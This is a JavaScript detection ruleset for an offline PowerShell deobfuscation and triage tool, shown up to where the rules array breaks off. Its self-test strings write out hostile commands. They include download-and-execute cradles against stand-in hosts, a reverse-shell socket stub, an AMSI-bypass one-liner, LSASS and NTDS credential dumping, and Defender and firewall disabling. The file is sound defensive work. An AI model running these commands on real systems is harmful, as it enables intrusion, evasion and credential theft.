/* psparse engine for fx — offline PowerShell / command-line deobfuscation and triage.
   Ported from psparse 3.0 (the author's standalone offline tool). No network,
   no storage, no execution: analysis is pure string work in the page.
   SECURITY: everything this module returns is untrusted text from evidence.
   Callers must escape it before putting it in the DOM (fx uses escapeHtml). */

const MAX_INPUT = 200000;   // guard against pathological-regex hangs
const MAX_DEPTH = 12;
const MIN_B64   = 16;

const SEV_WEIGHT = {info:0, low:1, medium:3, high:6, critical:10};

/* ---- detection ruleset (data-driven; extend per campaign) -------------
   Reviewed for fx: every technique id checked against MITRE ATT&CK
   Enterprise (data dated 31/07/2026); over-broad patterns tightened so that
   ordinary admin PowerShell and Windows' own commands don't score as
   malicious. Each rule's `t` lists true-positive / false-positive examples
   used by the self-tests. */
const RULES = [
 // ── Obfuscation ────────────────────────────────────────────────────────────
 {id:"ENC-B64CMD",name:"Encoded command (-EncodedCommand)",cat:"obfuscation",sev:"high",
  mitre:["T1027.010","T1059.001"],
  // -e, -ec, -en, -enc ... -encodedcommand (also /enc and en/em-dash switches).
  // Deliberately NOT any "-e…" switch: -ErrorAction SilentlyContinue would match.
  pat:[/(?:^|[\s"'])[-\/\u2013\u2014\u2015](?:e|ec|en(?:c\w*)?)\s+["']?[A-Za-z0-9+\/]{16,}={0,2}/i],
  desc:"Base64/UTF-16LE encoded script block passed to powershell.exe. Classic evasion of command-line inspection.",
  t:{tp:["powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA","powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0A","pwsh /ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA","powershell \u2013e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"],
     fp:["Get-ChildItem C:\\Temp -ErrorAction SilentlyContinue","Get-Service -Exclude WindowsUpdateService"]}},
 {id:"ENC-FROMB64",name:"FromBase64String decode",cat:"obfuscation",sev:"medium",mitre:["T1140"],
  pat:[/frombase64string/i],
  desc:"In-script base64 decode, typically feeding a byte array to decompression, GetString, or reflective load.",
  t:{tp:["[Convert]::FromBase64String($b)"],fp:["[Convert]::ToBase64String($b)"]}},
 {id:"ENC-COMPRESS",name:"In-memory (de)compression",cat:"obfuscation",sev:"medium",mitre:["T1140"],
  pat:[/(gzip|deflate)stream/i],
  desc:"Gzip/Deflate stream used to pack a payload so it never appears as plaintext on the command line.",
  t:{tp:["New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress)"],fp:["Compress-Archive -Path x -DestinationPath y.zip"]}},
 {id:"ENC-CHARJOIN",name:"Char-code / -join reconstruction",cat:"obfuscation",sev:"low",mitre:["T1027.010"],
  pat:[/\[char\](\[\])?\s*\(?\s*\d/i,/\(\s*\d{2,3}\s*(?:,\s*\d{2,3}\s*){3,}\)\s*\|?\s*%?\s*\{?[^\n]{0,40}-join/i],
  desc:"String rebuilt from integer/char arrays to defeat signature and keyword matching.",
  t:{tp:["[char]105+[char]101+[char]120","(105,101,120,32,40) -join ''"],fp:["$a -join ', '","[char]::IsDigit($c)"]}},
 {id:"ENC-REVERSE",name:"String reversal",cat:"obfuscation",sev:"low",mitre:["T1027.010"],
  pat:[/\[\s*-1\s*\.\.\s*-?\d+\s*\]\s*-join/i,/\[array\]::reverse\s*\(/i,/-join\s*\(?\s*\$\w+\s*\[\s*-1\s*\.\./i],
  desc:"A string stored backwards and reversed at run time, so keywords like DownloadString never appear in the command line.",
  t:{tp:["$m='gnirtSdaolnwoD'[-1..-14] -join ''","[Array]::Reverse($c); -join $c"],fp:["$list[-1]"]}},
 {id:"ENC-FORMAT",name:"Format-operator obfuscation",cat:"obfuscation",sev:"low",mitre:["T1027.010"],
  pat:[/'(?:[^']*\{\d+\}[^']*)+'\s*-f\s*'/i],
  desc:"-f format operator reorders string fragments to hide keywords like IEX / DownloadString.",
  t:{tp:["('{1}{0}' -f 'X','IE')"],fp:["'Total: {0}' -f $n"]}},
 {id:"ENC-BACKTICK",name:"Backtick token-splitting",cat:"obfuscation",sev:"low",mitre:["T1027.010"],
  // Backticks *inside an identifier*, not string escapes like `n / `t.
  pat:[/\b[a-z]+`[a-z]+`[a-z`]*/i,/\b[a-z]{1,}`(?![0abefnrtv])[a-z]+/i],
  desc:"Backtick inserted inside identifiers (e.g. i`e`x, Down`loadString) to break naive keyword detection.",
  t:{tp:["i`e`x (iwr x)","(New-Object Net.WebClient).Down`loadString('x')"],fp:["Write-Host \"line1`nline2`tend\""]}},

 // ── Execution ──────────────────────────────────────────────────────────────
 {id:"EXE-IEX",name:"Invoke-Expression (IEX)",cat:"execution",sev:"high",mitre:["T1059.001"],
  pat:[/\b(iex|invoke-expression)\b/i,/\.invoke\(\s*\)/i],
  desc:"Dynamic execution of a constructed string. Almost always the payload-detonation step in a cradle.",
  t:{tp:["IEX (New-Object Net.WebClient).DownloadString('http://x/a')","$sb.Invoke()"],fp:["Get-Process | Sort-Object CPU"]}},
 {id:"EXE-BYPASS",name:"ExecutionPolicy Bypass / Unrestricted",cat:"execution",sev:"medium",mitre:["T1059.001"],
  pat:[/(?:^|\s)[-\/](?:ep|ex\w*)\s+["']?(bypass|unrestricted)\b/i,/set-executionpolicy\s+(-\w+\s+)*["']?(bypass|unrestricted)\b/i],
  desc:"Disables execution policy for this process. Common in operator one-liners and initial-access lures.",
  t:{tp:["powershell -ExecutionPolicy Bypass -File x.ps1","powershell -ep bypass","powershell -exec bypass -nop","Set-ExecutionPolicy Unrestricted -Force"],fp:["Set-ExecutionPolicy RemoteSigned"]}},
 {id:"EXE-DYNMOD",name:"Dynamic ScriptBlock / in-memory module",cat:"execution",sev:"high",mitre:["T1059.001"],
  pat:[/scriptblock\]::create/i,/new-module\s+(-\w+\s+)*-?scriptblock/i,/\.getnewclosure/i,/\$executioncontext\.invokecommand\.(invokescript|newscriptblock)/i],
  desc:"Executes a string as code via [ScriptBlock]::Create / New-Module / InvokeScript instead of IEX - a common way to dodge Invoke-Expression keyword detection.",
  t:{tp:["& ([scriptblock]::Create($s))","$ExecutionContext.InvokeCommand.InvokeScript($s)"],fp:["Invoke-Command -ScriptBlock { Get-Date }"]}},
 {id:"EXE-NOPROFILE",name:"Non-interactive / hidden launch flags",cat:"stealth",sev:"low",mitre:["T1564.003"],
  pat:[/(?:^|\s)[-\/]nop(r\w*)?\b/i,/(?:^|\s)[-\/]noni(n\w*)?\b/i,/(?:^|\s)[-\/]w(i\w*)?\s+["']?(h(i\w*)?|1)\b/i],
  desc:"Hidden-window / no-profile / non-interactive flags. Typical of automated or staged execution.",
  t:{tp:["powershell -w hidden -c x","powershell -win hid -c x","powershell -windowstyle 1","powershell -nop -noni"],fp:["powershell -WindowStyle Normal","Get-Process -Name winword"]}},
 {id:"EXE-ADDTYPE",name:"Add-Type / runtime C# compilation",cat:"execution",sev:"medium",mitre:["T1059.001"],
  pat:[/add-type\b/i,/dllimport/i,/reflection\.emit/i,/\b(kernel32|ntdll|user32|advapi32)(\.dll)?\b/i],
  desc:"Compiles or loads C#/.NET at runtime or imports Win32 APIs (Add-Type / DllImport). Used legitimately (e.g. to hide a console window), and to reach VirtualAlloc / CreateThread for shellcode - check which functions are imported.",
  t:{tp:["Add-Type -TypeDefinition $src","[DllImport(\"kernel32.dll\")]"],fp:["Get-Content x.txt"]}},
 {id:"EXE-WMIPROC",name:"Process creation via WMI/CIM",cat:"execution",sev:"medium",mitre:["T1047"],
  pat:[/invoke-wmimethod[^\n;]{0,120}win32_process[^\n;]{0,60}create/i,/invoke-cimmethod[^\n;]{0,120}win32_process[^\n;]{0,80}create/i,/\[wmiclass\][^\n;]{0,60}win32_process/i,/\bwmic(\.exe)?\s+(\/node:\S+\s+)?process\s+call\s+create/i],
  desc:"Starts a process through WMI, locally or on a remote host, which breaks the usual parent-child process chain.",
  t:{tp:["Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList calc","wmic /node:10.0.0.5 process call create \"cmd /c x\""],fp:["Get-CimInstance Win32_Process"]}},
 {id:"EXE-CLICKFIX",name:"ClickFix / fake CAPTCHA lure",cat:"execution",sev:"high",mitre:["T1204.004","T1059.001"],
  pat:[/#[^\n]{0,120}(not a robot|i am human|captcha|human verification|verification (id|code)|cloudflare|ray id)/i,/\bmshta(\.exe)?\s+["']?https?:\/\//i,/conhost(\.exe)?\s+--headless/i],
  desc:"Matches the ClickFix pattern: a web page tells the user to paste a command into the Run dialog or a terminal to 'prove they are human'. The trailing comment hides the real command in the Run box.",
  t:{tp:["powershell -w h -c \"iex (irm 'https://x/c.txt')\" # I am not a robot - Cloudflare Ray ID 8f2a","mshta https://x.example/verify.hta"],fp:["# install module\nInstall-Module Pester"]}},
 {id:"EXE-LOLBIN",name:"Signed binary proxy execution",cat:"stealth",sev:"medium",mitre:["T1218.005","T1218.010","T1218.011"],
  pat:[/\bmshta(\.exe)?\s+["']?(vbscript|javascript|https?:)/i,
       /\bregsvr32(\.exe)?\s+[^\n]{0,60}(\/i:\s*https?:|scrobj\.dll)/i,
       /\brundll32(\.exe)?["']?\s+[^\n]{0,80}(javascript:|vbscript:|mshtml,|runhtmlapplication|url\.dll,|ieframe\.dll,|shdocvw\.dll,|advpack\.dll,|setupapi\.dll,installhinfsection|pcwutl\.dll,|zipfldr\.dll,routethecall)/i,
       /\brundll32(\.exe)?["']?\s+["']?(?!(?:%windir%|%systemroot%|\$env:(?:windir|systemroot)|[a-z]:\\windows)\\(?:system32|syswow64)\\)[^\s,"']*[\\\/][^\s,"']*,/i,
       /\brundll32(\.exe)?["']?\s+["']?[^\s,"']+\.(dat|tmp|txt|log|bin|db|ini|png|jpg|jpeg|gif|bmp|ico|cfg|xml|json)\s*,/i],
  desc:"Uses a trusted Windows binary (mshta, regsvr32, rundll32) to run attacker code: script / URL proxying, a DLL loaded from outside System32, or a 'DLL' with a non-DLL extension.",
  t:{tp:["rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \"","rundll32 C:\\ProgramData\\x\\a.dll,Start","rundll32 C:\\Users\\p\\AppData\\Local\\Temp\\x.tmp,DllMain","regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll","mshta vbscript:Execute(\"x\")"],
     fp:["%windir%\\system32\\rundll32.exe %windir%\\system32\\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask","rundll32.exe Startupscan.dll,SusRunTask","C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL"]}},

 // ── Command and control / ingress ─────────────────────────────────────────
 {id:"C2-WEBCLIENT",name:"Net.WebClient download cradle",cat:"command-and-control",sev:"high",mitre:["T1105","T1059.001"],
  pat:[/net\.webclient/i,/\.downloadstring\s*\(/i,/\.downloadfile\s*\(/i,/\.downloaddata\s*\(/i,/\.openread\s*\(/i],
  desc:"Downloads a stage/payload from a remote host. DownloadString+IEX is the canonical PowerShell cradle.",
  t:{tp:["(New-Object Net.WebClient).DownloadString('http://x/a')"],fp:["Get-ChildItem Downloads"]}},
 {id:"C2-IWR",name:"Invoke-WebRequest / Invoke-RestMethod",cat:"command-and-control",sev:"medium",mitre:["T1105"],
  pat:[/\b(invoke-webrequest|iwr|invoke-restmethod|irm|wget|curl)\b(?!\.exe\s+--version)/i],
  desc:"HTTP(S) fetch of remote content. Benign in admin scripts; suspicious when paired with IEX or an IP literal.",
  t:{tp:["iwr http://10.0.0.5/a.ps1 -OutFile a.ps1","irm https://x/c.txt"],fp:["Get-Item C:\\x"]}},
 {id:"C2-HTTPCLIENT",name:".NET HttpClient download",cat:"command-and-control",sev:"medium",mitre:["T1105"],
  pat:[/system\.net\.http\.httpclient/i,/\.getstringasync\s*\(/i,/\.getbytearrayasync\s*\(/i],
  desc:"Fetches remote content with HttpClient, an alternative to WebClient that some detections miss.",
  t:{tp:["$c=[System.Net.Http.HttpClient]::new(); $c.GetStringAsync('http://x').Result"],fp:["Get-Date"]}},
 {id:"C2-BITS",name:"BITS transfer",cat:"command-and-control",sev:"medium",mitre:["T1105","T1197"],
  pat:[/start-bitstransfer/i,/\bbitsadmin(\.exe)?\s+[^\n]{0,40}\/(transfer|addfile|create)/i],
  desc:"Background Intelligent Transfer Service used to pull a payload while surviving reboots.",
  t:{tp:["Start-BitsTransfer -Source http://x/a.exe -Destination a.exe","bitsadmin /transfer j /download /priority high http://x/a C:\\a"],fp:["Get-BitsTransfer"]}},
 {id:"C2-CERTUTIL",name:"certutil download or decode",cat:"command-and-control",sev:"medium",mitre:["T1105","T1140"],
  pat:[/certutil(\.exe)?\s+[^\n]{0,40}-urlcache/i,/certutil(\.exe)?\s+[^\n]{0,40}-decode(hex)?\b/i,/certutil(\.exe)?\s+[^\n]{0,40}-verifyctl\s+[^\n]{0,20}-f\b/i,/certutil(\.exe)?\s+[^\n]{0,40}-f\s+["']?https?:\/\//i],
  desc:"certutil used to download a file or decode a base64 payload.",
  t:{tp:["certutil -urlcache -split -f http://x/a.exe a.exe","certutil -decode a.b64 a.exe","certutil -verifyctl -split -f http://x/a"],fp:["certutil -store my"]}},
 {id:"C2-RMM",name:"Remote access tool",cat:"command-and-control",sev:"medium",mitre:["T1219.002"],
  pat:[/\b(anydesk|screenconnect|connectwise|atera(agent)?|splashtop|netsupport|client32\.exe|rustdesk|teamviewer|meshagent|simplehelp|ammyy|tacticalrmm|fleetdeck|zohoassist|level\.io|remoteutilities)\b/i],
  desc:"References a remote monitoring and management tool. Attackers install these for persistent hands-on access.",
  t:{tp:["Start-Process AnyDesk.exe --install","msiexec /i ScreenConnect.ClientSetup.msi"],fp:["Get-Service wuauserv"]}},
 {id:"C2-DNS",name:"DNS TXT retrieval",cat:"command-and-control",sev:"medium",mitre:["T1071.004"],
  pat:[/resolve-dnsname\b[^\n;|]{0,80}-type\s+txt/i,/nslookup(\.exe)?\s+(-q(uerytype)?=|-type=)txt/i],
  desc:"Pulls TXT records over DNS, a channel used to fetch commands or staged payloads that bypasses web proxies.",
  t:{tp:["(Resolve-DnsName x.example -Type TXT).Strings","nslookup -q=txt x.example"],fp:["Resolve-DnsName x.example"]}},
 {id:"REV-SHELL",name:"Reverse shell / raw TCP client",cat:"command-and-control",sev:"high",mitre:["T1095","T1059.001"],
  pat:[/net\.sockets\.tcpclient/i,/\btcpclient\b/i,/tcplistener/i,/\.getstream\s*\(/i,/redirectstandardinput/i,/\bpowercat\b/i],
  desc:"Creates a raw TCP client/socket, typically a PowerShell reverse shell for interactive C2.",
  t:{tp:["$c=New-Object System.Net.Sockets.TCPClient('10.0.0.5',443);$s=$c.GetStream()"],fp:["Test-NetConnection x -Port 443"]}},

 // ── Defense impairment / stealth ─────────────────────────────────────────
 {id:"DEF-AMSI",name:"AMSI bypass",cat:"defense-impairment",sev:"critical",mitre:["T1685"],
  pat:[/amsiutils/i,/amsiinitfailed/i,/amsicontext/i,/amsiscanbuffer/i,/amsi\.dll/i,/system\.management\.automation\.amsi/i],
  desc:"Tampering with the Antimalware Scan Interface so subsequent script content is not scanned.",
  t:{tp:["[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"],fp:["Get-MpComputerStatus"]}},
 {id:"DEF-ETW",name:"ETW / logging tamper",cat:"defense-impairment",sev:"high",mitre:["T1685","T1685.001"],
  pat:[/etweventwrite/i,/psetwlogprovider/i,/(enable)?scriptblocklogging[^\n]{0,60}(\b0\b|\$false|disable)/i,/m_enabled[^\n]{0,40}\$false/i],
  desc:"Attempts to blind Event Tracing for Windows or turn off PowerShell script-block logging.",
  t:{tp:["[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue($p,$false) # PSEtwLogProvider","Set-ItemProperty HKLM:\\...\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0"],fp:["Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational'"]}},
 {id:"DEF-DEFENDER",name:"Defender protection disabled",cat:"defense-impairment",sev:"high",mitre:["T1685"],
  pat:[/set-mppreference.{0,80}-disable\w+\s+(\$true|1)\b/i,/disablerealtimemonitoring\s*(=|\s)\s*(\$true|1)/i,/disableantispyware/i,/disableioavprotection\s+(\$true|1)/i,/disablebehaviormonitoring\s+(\$true|1)/i,/disablescriptscanning\s+(\$true|1)/i,/mpcmdrun(\.exe)?\s+-removedefinitions/i,/set-mppreference.{0,80}-(mapsreporting\s+(0|disabled)|submitsamplesconsent\s+(2|neveresend))/i],
  desc:"Turns off Microsoft Defender protections (real-time, behaviour, script scanning, cloud protection) or removes its signatures.",
  t:{tp:["Set-MpPreference -DisableRealtimeMonitoring $true","Set-MpPreference -MAPSReporting 0","reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1"],fp:["Get-MpPreference | Select DisableRealtimeMonitoring","Set-MpPreference -DisableRealtimeMonitoring $false"]}},
 {id:"DEF-EXCLUSION",name:"Defender exclusion added",cat:"stealth",sev:"high",mitre:["T1564.012"],
  pat:[/add-mppreference.{0,60}-exclusion(path|process|extension|ipaddress)/i,/set-mppreference.{0,60}-exclusion(path|process|extension)/i,/windows defender\\exclusions\\(paths|processes|extensions)/i],
  desc:"Adds a Defender exclusion so tooling in that path, process or extension is never scanned. A common pre-staging step for ransomware and loaders.",
  t:{tp:["Add-MpPreference -ExclusionPath C:\\ProgramData"],fp:["Get-MpPreference | Select ExclusionPath"]}},
 {id:"DEF-FIREWALL",name:"Windows firewall disabled",cat:"defense-impairment",sev:"high",mitre:["T1686.003"],
  pat:[/netsh(\.exe)?\s+(advfirewall\s+set\s+\w+\s+state\s+off|firewall\s+set\s+opmode\s+(mode=)?disable)/i,/set-netfirewallprofile[^\n;|]{0,80}-enabled\s+["']?(false|0|\$false)/i],
  desc:"Turns off the Windows host firewall, typically before lateral movement or opening a listener.",
  t:{tp:["netsh advfirewall set allprofiles state off","Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"],fp:["netsh advfirewall show allprofiles","Set-NetFirewallProfile -Enabled True"]}},
 {id:"DEF-DOWNGRADE",name:"PowerShell version 2 downgrade",cat:"defense-impairment",sev:"high",mitre:["T1689"],
  pat:[/powershell(\.exe)?\b[^\n|;]{0,80}\s[-\/]v(ersion)?\s+2(\.0)?\b/i],
  desc:"Starts the legacy PowerShell 2.0 engine, which has no AMSI and no script-block logging.",
  t:{tp:["powershell.exe -version 2 -nop -c x","powershell -w hidden -v 2 -c x"],fp:["$PSVersionTable.PSVersion"]}},
 {id:"DEF-LOGCLEAR",name:"Event log cleared",cat:"defense-impairment",sev:"high",mitre:["T1685.005"],
  pat:[/wevtutil(\.exe)?\s+(cl|clear-log)\b/i,/clear-eventlog/i,/remove-eventlog/i,/eventlogsession\]::globalsession\.clearlog/i,/\.clearlog\s*\(/i],
  desc:"Clears Windows event logs to destroy evidence of earlier activity.",
  t:{tp:["wevtutil cl Security","Clear-EventLog -LogName Security"],fp:["wevtutil qe Security /c:5"]}},
 {id:"DEF-HISTORY",name:"Command history cleared or disabled",cat:"stealth",sev:"medium",mitre:["T1070.003","T1690"],
  pat:[/set-psreadlineoption[^\n;|]{0,60}-historysavestyle\s+["']?savenothing/i,/(remove-item|del|rm|clear-content)\b[^\n;|]{0,120}consolehost_history\.txt/i,/\(get-psreadlineoption\)\.historysavepath/i,/\bclear-history\b/i],
  desc:"Deletes or stops writing PowerShell command history (PSReadLine), destroying a key record of hands-on-keyboard activity.",
  t:{tp:["Set-PSReadLineOption -HistorySaveStyle SaveNothing","Remove-Item (Get-PSReadLineOption).HistorySavePath"],fp:["Get-History"]}},
 {id:"DEF-TIMESTOMP",name:"File timestamps altered",cat:"stealth",sev:"medium",mitre:["T1070.006"],
  pat:[/\.(creationtime|lastwritetime|lastaccesstime)(utc)?\s*=/i],
  desc:"Sets a file's created / modified / accessed time to blend a dropped file in with legitimate ones (timestomping).",
  t:{tp:["(Get-Item C:\\x.exe).LastWriteTime = '01/01/2019 10:00'"],fp:["(Get-Item C:\\x.exe).LastWriteTime"]}},
 {id:"DEF-HIDDEN",name:"Files hidden",cat:"stealth",sev:"low",mitre:["T1564.001"],
  pat:[/\battrib(\.exe)?\s+[^\n]{0,20}\+h\b/i,/\.attributes\s*=\s*[^\n;]{0,40}hidden/i],
  desc:"Marks files or folders hidden / system so they don't show in Explorer.",
  t:{tp:["attrib +h +s C:\\ProgramData\\x","(Get-Item x).Attributes = 'Hidden'"],fp:["attrib C:\\x"]}},
 {id:"PATH-STAGING",name:"Reference to a staging directory",cat:"stealth",sev:"medium",mitre:[],
  pat:[/\\users\\public\\/i,/\\appdata\\(local|roaming)\\temp\\/i,/\\programdata\\[^\\\s'"]+\.(ps1|exe|dll|bat|vbs|hta|scr|js)\b/i,/\\windows\\temp\\/i,/\$env:(temp|tmp)\b/i,/\\temp\\[^\\\s'"]+\.(ps1|exe|dll|bat|vbs|hta|scr)\b/i],
  desc:"References a common malware staging directory (Public, Temp, ProgramData). Legitimate software uses these too, so correlate with the file written or run.",
  t:{tp:["Invoke-WebRequest http://x/a -OutFile $env:TEMP\\a.exe","C:\\Users\\Public\\svc.exe"],fp:["C:\\Program Files\\App\\app.exe"]}},

 // ── Process injection / in-memory loading ─────────────────────────────────
 {id:"INJ-REFLECT",name:"Reflective assembly load",cat:"stealth",sev:"high",mitre:["T1620"],
  pat:[/reflection\.assembly\]\s*::\s*load\s*\(/i,/\[system\.reflection\.assembly\]::load/i,/\bassembly\]::load(file|withpartialname)?\s*\(\s*\[/i],
  desc:"Loads a .NET assembly from memory with no file on disk. Common for post-exploitation frameworks.",
  t:{tp:["[Reflection.Assembly]::Load($bytes)","[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b))"],fp:["Add-Type -AssemblyName System.Windows.Forms"]}},
 {id:"INJ-SHELLCODE",name:"Shellcode / process-injection APIs",cat:"stealth",sev:"critical",mitre:["T1055"],
  pat:[/\bvirtualalloc(ex)?\b/i,/\bcreateremotethread\b/i,/\bwriteprocessmemory\b/i,/\bvirtualprotect(ex)?\b/i,/getdelegateforfunctionpointer/i,/\bntcreatethreadex\b/i,/\bqueueuserapc\b/i,/\brtlmovememory\b/i],
  desc:"Win32/native primitives for allocating executable memory and running shellcode in-process or in another process.",
  t:{tp:["$m=[Win32]::VirtualAlloc(0,$sc.Length,0x3000,0x40)","[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p,[Func])"],fp:["Add-Type -Name W -Namespace N -MemberDefinition '[DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr h,int n);'"]}},

 // ── Credential access ─────────────────────────────────────────────────────
 {id:"CRED-MIMI",name:"Mimikatz / LSASS dump",cat:"credential-access",sev:"critical",mitre:["T1003.001"],
  pat:[/mimikatz/i,/invoke-mimikatz/i,/sekurlsa::/i,/\blogonpasswords\b/i,/lsadump::/i,/comsvcs(\.dll)?\s*,?\s*#?\s*(minidump|24)\b/i,/procdump(64)?(\.exe)?\s+[^\n]{0,40}-ma\s+[^\n]{0,20}lsass/i,/out-minidump/i,/(minidumpwritedump|\bnanodump\b|\bsafetykatz\b|\bpypykatz\b)/i],
  desc:"Credential dumping via Mimikatz-family tools or by dumping LSASS process memory (comsvcs MiniDump, procdump, Out-Minidump).",
  t:{tp:["Invoke-Mimikatz -DumpCreds","rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full","procdump64.exe -accepteula -ma lsass.exe l.dmp"],fp:["Get-Process lsass | Select CPU"]}},
 {id:"CRED-NTDS",name:"NTDS.dit / SAM hive copied",cat:"credential-access",sev:"critical",mitre:["T1003.003","T1003.002"],
  pat:[/ntdsutil(\.exe)?\s+[^\n]{0,60}(ifm|create\s+full)/i,/\\ntds\\ntds\.dit/i,/\bntds\.dit\b[^\n]{0,60}(copy|shadow|\\\\\?\\globalroot)/i,/\breg(\.exe)?\s+save\s+["']?hklm\\(sam|system|security)\b/i,/(copy|copy-item)[^\n]{0,80}harddiskvolumeshadowcopy\d*\\windows\\(ntds|system32\\config)\\/i],
  desc:"Copies the domain database (NTDS.dit) or the SAM / SYSTEM / SECURITY hives to extract password hashes offline.",
  t:{tp:["ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\\x\" q q","reg save HKLM\\SAM C:\\temp\\sam.save","copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp"],fp:["reg query HKLM\\SYSTEM\\CurrentControlSet"]}},
 {id:"CRED-KERBEROAST",name:"Kerberoasting",cat:"credential-access",sev:"high",mitre:["T1558.003"],
  pat:[/invoke-kerberoast/i,/\brubeus(\.exe)?\b[^\n]{0,40}\b(kerberoast|asreproast)\b/i,/kerberosrequestorsecuritytoken/i,/\bsetspn(\.exe)?\s+[^\n]{0,10}-[tq]\s+\*/i],
  desc:"Requests Kerberos service tickets for SPN accounts to crack their passwords offline.",
  t:{tp:["Invoke-Kerberoast -OutputFormat Hashcat","Rubeus.exe kerberoast /outfile:h.txt","New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/x'"],fp:["klist"]}},
 {id:"CRED-BROWSER",name:"Browser credential store access",cat:"credential-access",sev:"high",mitre:["T1555.003"],
  pat:[/\\(google\\chrome|microsoft\\edge|bravesoftware\\brave-browser)\\user data/i,/\blogin data\b/i,/\blogins\.json\b/i,/\bkey4\.db\b/i,/\bcookies\.sqlite\b/i,/\\local state\b/i],
  desc:"Touches browser password, cookie or key stores. Typical of infostealers.",
  t:{tp:["Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" $env:TEMP"],fp:["Start-Process chrome.exe"]}},
 {id:"CRED-PROMPT",name:"Credential prompt / capture",cat:"credential-access",sev:"medium",mitre:["T1056.002"],
  pat:[/get-credential/i,/promptforcredential/i,/\[system\.net\.networkcredential\]/i],
  desc:"Prompts for or constructs credentials; in phishing scripts this is often credential harvesting.",
  t:{tp:["$c=$Host.UI.PromptForCredential('Windows Security','Enter your password','','')"],fp:["Get-Date"]}},
 {id:"CRED-PLAINTEXT",name:"Plain-text password in script",cat:"credential-access",sev:"low",mitre:["T1552.001"],
  pat:[/convertto-securestring\s+[^|;\n]{0,80}-asplaintext/i,/-password\s+['"][^'"]{4,}['"]/i,/\/pass(word)?:\s*\S{4,}/i],
  desc:"A password appears in clear text. Useful to the investigation and a finding in its own right.",
  t:{tp:["ConvertTo-SecureString 'Summer2024!' -AsPlainText -Force"],fp:["Read-Host -AsSecureString"]}},

 // ── Persistence / privilege escalation ───────────────────────────────────
 {id:"PER-SCHTASK",name:"Scheduled task persistence",cat:"persistence",sev:"high",mitre:["T1053.005"],
  pat:[/register-scheduledtask/i,/new-scheduledtask(action|trigger)?\b/i,/schtasks(\.exe)?\s+\/create/i],
  desc:"Creates a scheduled task to survive reboots / re-run a payload.",
  t:{tp:["schtasks /create /tn Upd /tr C:\\x.exe /sc onlogon","Register-ScheduledTask -TaskName U -Action $a -Trigger $t"],fp:["schtasks /query /fo list","Get-ScheduledTask"]}},
 {id:"PER-RUNKEY",name:"Run-key / Startup folder persistence",cat:"persistence",sev:"high",mitre:["T1547.001"],
  pat:[/currentversion\\run(once)?(services)?(\\|["'\s]|$)/i,/start menu\\programs\\startup\\/i,/\[environment\]::getfolderpath\(\s*['"]?startup/i,/shell:startup/i],
  desc:"Writes an autostart entry under a Run/RunOnce registry key or into the Startup folder.",
  t:{tp:["New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name U -Value C:\\x.exe","reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v U /d C:\\x.exe"],fp:["New-ItemProperty -Path HKCU:\\Software\\Vendor\\App -Name Setting -Value 1"]}},
 {id:"PER-SERVICE",name:"Service created",cat:"persistence",sev:"high",mitre:["T1543.003","T1569.002"],
  pat:[/\bnew-service\b/i,/\bsc(\.exe)?\s+(\\\\\S+\s+)?create\s+/i,/currentcontrolset\\services\\[^\\\s'"]+["'\s][^\n]{0,60}imagepath/i],
  desc:"Installs a Windows service, used for persistence and to run tools as SYSTEM (also how PsExec-style tools execute remotely).",
  t:{tp:["sc.exe create Updater binPath= \"C:\\ProgramData\\u.exe\" start= auto","New-Service -Name U -BinaryPathName C:\\x.exe"],fp:["sc query wuauserv","Get-Service"]}},
 {id:"PER-WMI",name:"WMI event-subscription persistence",cat:"persistence",sev:"high",mitre:["T1546.003"],
  pat:[/__eventfilter/i,/commandlineeventconsumer/i,/activescripteventconsumer/i,/__filtertoconsumerbinding/i],
  desc:"Permanent WMI event subscription — a stealthy, fileless persistence mechanism.",
  t:{tp:["Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name='x'}"],fp:["Get-WmiObject Win32_OperatingSystem"]}},
 {id:"PER-ACCOUNT",name:"Account created / added to Administrators",cat:"persistence",sev:"high",mitre:["T1136.001","T1098"],
  pat:[/\bnet1?(\.exe)?\s+user\s+\S+\s+\S*\s*\/add/i,/\bnet1?(\.exe)?\s+(local)?group\s+["']?(administrators|domain admins|enterprise admins|remote desktop users)["']?\s+\S+\s+\/add/i,/\bnew-localuser\b/i,/add-localgroupmember\s+[^\n;|]{0,40}(administrators|remote desktop users)/i,/add-adgroupmember\s+[^\n;|]{0,40}(domain admins|enterprise admins)/i],
  desc:"Creates an account or adds one to a privileged group — persistence and privilege escalation.",
  t:{tp:["net user support P@ssw0rd /add","net localgroup administrators support /add","Add-LocalGroupMember -Group Administrators -Member support"],fp:["net user","net localgroup administrators"]}},
